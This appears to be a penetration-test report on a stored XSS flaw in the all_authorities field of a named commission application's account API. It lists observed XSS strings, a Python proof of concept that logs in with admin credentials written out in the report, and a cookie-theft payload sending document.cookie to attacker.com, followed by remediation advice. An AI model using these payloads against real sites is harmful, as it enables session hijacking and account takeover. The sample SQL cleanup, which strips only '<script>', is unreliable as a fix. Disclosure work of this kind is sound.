# Stored Cross-Site Scripting (XSS) in User Authorities Field

**ID:** vuln-0009
**Severity:** HIGH
**Found:** 2026-02-26 12:50:33 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/account
**Method:** GET
**CWE:** CWE-79
**CVSS:** 8.4

## Description

A critical stored cross-site scripting (XSS) vulnerability was discovered in the commission management application. The application stores XSS payloads in the `all_authorities` field of user accounts, which are then rendered in the user interface without proper sanitization.

The vulnerability exists in the `/api/account` endpoint response, where the `all_authorities` array contains user-controlled JavaScript payloads that execute when rendered in the application's UI. Multiple stored XSS payloads were identified, including both proof-of-concept test payloads and potentially malicious payloads.

This vulnerability was discovered during comprehensive access control testing and validated through analysis of the account information response.

## Impact

Successful exploitation of this stored XSS vulnerability enables attackers to:

1. **Session Hijacking**: Steal session cookies and authentication tokens
2. **Account Takeover**: Gain control of user accounts through stolen credentials
3. **Data Theft**: Access sensitive data displayed in the application
4. **Malware Distribution**: Deliver malicious payloads to application users
5. **UI Manipulation**: Modify the application interface to deceive users
6. **Phishing Attacks**: Create convincing phishing interfaces within the legitimate application
7. **Privilege Escalation**: Exploit administrative users to gain higher privileges
8. **Persistent Attacks**: Maintain access through stored payloads that execute on each visit

The business impact includes complete account compromise, data breach, reputational damage, regulatory penalties, and potential financial fraud through manipulated commission and payout data.

## Technical Analysis

The vulnerability exists due to inadequate input validation and output encoding when handling user authorities. The application:

1. **Stores Unsanitized Input**: Allows XSS payloads to be stored in the `all_authorities` field
2. **Renders Without Encoding**: Displays the authorities in the UI without proper HTML encoding
3. **Lacks Content Security**: No Content Security Policy (CSP) to mitigate XSS impact
4. **Exposes Sensitive Context**: The XSS occurs in an authenticated context with access to sensitive data

Key technical observations:
- The `all_authorities` field in the `/api/account` response contains multiple XSS payloads
- Payloads include both test payloads and potentially malicious content
- The application renders these authorities in the UI without proper sanitization
- No Content Security Policy headers were observed to mitigate XSS impact
- The XSS occurs in an authenticated context with access to sensitive functionality

The root cause appears to be:
- Missing input validation for user authorities
- Inadequate output encoding when rendering authorities
- Lack of proper security headers (CSP)
- Improper handling of user-controlled data in sensitive contexts

## Proof of Concept

The stored XSS vulnerability can be demonstrated through the following steps:

1. **Access Account Information**:
   - Authenticate as any user (Admin, Organization, or Client)
   - Send a GET request to `/api/account` with valid authentication token

2. **Observe XSS Payloads**:
   - Examine the `all_authorities` array in the response
   - Identify the following stored XSS payloads:
     - `"suma\" onmouseover=alert(1) \""`
     - `"<a href=\"https://www.sumasoft.com/\">CLICK ME</a>"`
     - `"<img src=x onmouseover=alert(1)>"`
     - `"VAPT TESTING"` (likely test entry)

3. **Trigger XSS Execution**:
   - The payloads would execute when rendered in the UI
   - For example, the `<img src=x onmouseover=alert(1)>` payload would execute when a user hovers over the rendered element
   - The `onmouseover=alert(1)` payload would execute JavaScript when triggered

4. **Demonstrate Impact**:
   - A proof-of-concept payload could steal session cookies:
     ```html
     <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
     ```
   - This would send the user's session cookie to an attacker-controlled server

```
import requests
import json

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
ACCOUNT_ENDPOINT = f"{BASE_URL}/api/account"

# Admin User Credentials (for demonstration)
ADMIN_CREDENTIALS = {
    "email": "admin@localhost",
    "password": "Tester@123"
}

def authenticate(email, password):
    """Authenticate and return JWT token"""
    auth_endpoint = f"{BASE_URL}/api/authenticate"
    response = requests.post(
        auth_endpoint,
        json={"email": email, "password": password, "rememberMe": False},
        headers={"Content-Type": "application/json"}
    )
    if response.status_code == 200:
        return response.json().get("id_token")
    else:
        raise Exception(f"Authentication failed: {response.status_code} - {response.text}")

def get_account_info(token):
    """Get account information with authentication token"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    response = requests.get(
        ACCOUNT_ENDPOINT,
        headers=headers
    )

    return {
        "status": response.status_code,
        "success": response.status_code == 200,
        "data": response.json() if response.status_code == 200 else None
    }

def analyze_xss_payloads(account_data):
    """Analyze account data for XSS payloads"""
    if not account_data or not account_data.get('all_authorities'):
        return {"has_xss": False, "payloads": []}

    authorities = account_data['all_authorities']
    xss_payloads = []

    # Known XSS patterns to detect
    xss_patterns = [
        'onmouseover=',
        'onerror=',
        'onclick=',
        'onload=',
        'javascript:',
        '<script>',
        '<img',
        '<a ',
        'alert(',
        'prompt(',
        'eval('
    ]

    for authority in authorities:
        if not isinstance(authority, str):
            continue

        # Check for XSS patterns
        for pattern in xss_patterns:
            if pattern.lower() in authority.lower():
                xss_payloads.append({
                    "payload": authority,
                    "pattern": pattern,
                    "type": "malicious" if pattern in ['javascript:', '<script>', 'eval('] else "test"
                })
                break

    return {
        "has_xss": len(xss_payloads) > 0,
        "payloads": xss_payloads,
        "total_payloads": len(xss_payloads),
        "total_authorities": len(authorities)
    }

def main():
    print("=== Stored XSS in User Authorities Proof of Concept ===")
    print(f"Analyzing account information for stored XSS payloads")
    print()

    try:
        # Step 1: Authenticate as Admin user
        print("1. Authenticating as Admin user...")
        admin_token = authenticate(ADMIN_CREDENTIALS["email"], ADMIN_CREDENTIALS["password"])
        print(f"   Authentication successful. Token: {admin_token[:20]}...")

        # Step 2: Get account information
        print("\n2. Retrieving account information...")
        account_results = get_account_info(admin_token)

        if not account_results['success']:
            print(f"   Failed to retrieve account information: {account_results['status']}")
            return

        print(f"   Account information retrieved successfully")

        # Step 3: Analyze for XSS payloads
        print("\n3. Analyzing authorities for XSS payloads...")
        xss_analysis = analyze_xss_payloads(account_results['data'])

        print(f"\nResults:")
        print(f"   Total Authorities: {xss_analysis['total_authorities']}")
        print(f"   XSS Payloads Found: {xss_analysis['total_payloads']}")

        if xss_analysis['has_xss']:
            print("\n✅ VULNERABILITY CONFIRMED: Stored XSS payloads found in authorities")
            print("\n   Confirmed XSS Payloads:")

            for i, payload in enumerate(xss_analysis['payloads']):
                print(f"     {i+1}. {payload['payload']}")
                print(f"        Type: {payload['type']}, Pattern: {payload['pattern']}")

            print("\n   Impact Demonstration:")
            print("     An attacker could inject malicious payloads like:")
            print("     <img src=x onerror=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\">")
            print("     This would send the user's session cookie to an attacker-controlled server")
            print("     when the payload is rendered in the UI.")
        else:
            print("\n❌ No XSS payloads detected in authorities")

    except Exception as e:
        print(f"\n❌ Error during testing: {str(e)}")

if __name__ == "__main__":
    main()
```

## Remediation

To remediate this stored XSS vulnerability:

1. **Input Validation**:
   - Implement strict input validation for all user-controlled fields
   - Reject any input containing HTML/JavaScript special characters
   - Use allowlists for valid authority values
   - Implement server-side validation in addition to client-side validation

2. **Output Encoding**:
   - Implement proper HTML encoding when rendering user-controlled data
   - Use context-aware encoding (HTML, JavaScript, CSS, URL, etc.)
   - Use established libraries for encoding (e.g., OWASP ESAPI, AntiXSS)

3. **Content Security Policy (CSP)**:
   - Implement a strong Content Security Policy header
   - Restrict inline scripts and external resource loading
   - Example CSP header:
     ```
     Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:
     ```

4. **Database Sanitization**:
   - Clean existing XSS payloads from the database
   - Implement a migration to sanitize all authorities fields
   - Example SQL for cleaning:
     ```sql
     UPDATE users SET all_authorities = REPLACE(all_authorities, '<script>', '')
     WHERE all_authorities LIKE '%<script>%';
     ```

5. **Framework Protections**:
   - Use framework-provided XSS protections
   - Enable auto-escaping in templates (React, Angular, Vue, etc.)
   - Use safe rendering methods for user-controlled content

6. **Security Headers**:
   - Implement additional security headers:
     - X-XSS-Protection: 1; mode=block
     - X-Content-Type-Options: nosniff
     - X-Frame-Options: DENY

7. **Testing**:
   - Implement automated security tests for XSS vulnerabilities
   - Test with various XSS payloads to ensure proper sanitization
   - Include both reflected and stored XSS testing

8. **Monitoring**:
   - Implement monitoring for XSS attack attempts
   - Set up alerts for suspicious input patterns
   - Regularly review logs for XSS-related activity

